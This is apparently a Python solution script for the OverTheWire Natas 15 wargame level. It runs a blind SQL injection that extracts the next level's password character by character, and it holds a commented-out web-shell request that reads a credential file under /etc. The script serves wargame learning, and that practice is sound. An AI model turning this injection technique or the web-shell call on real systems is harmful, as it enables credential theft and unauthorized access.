#!/usr/bin/env python3

import requests
import re
import urllib
import base64
import binascii
from string import *

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# blind sql injection
response = session.post(url, data = { "username": '" SELECT * FROM users WHERE name="natas16" and password="" or "1"="1" #', "password": "sql_injection" }, auth = (username, password))
seen_password = list('WaIHEacj63wnNIBROHeqi3p9t0m5nhm')
while(len(seen_password) < 32):
	for ch in characters:
		print("Trying with password", "".join(seen_password) + ch)
		response = session.post(url, data = { "username" : 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + ch + '%" #' }, auth = (username, password))

		content = response.text

		if('user exists' in content):
			seen_password.append(ch)
			break

response = requests.get(url, auth = (username, password))
# response = session.get(url + "upload/uyqhobeodo.php?c=cat /etc/natas_webpass/natas14", auth = (username, password))

# content = response.text

# print(content)

# print(re.findall('natas15 is (.*)<br>', content)[0])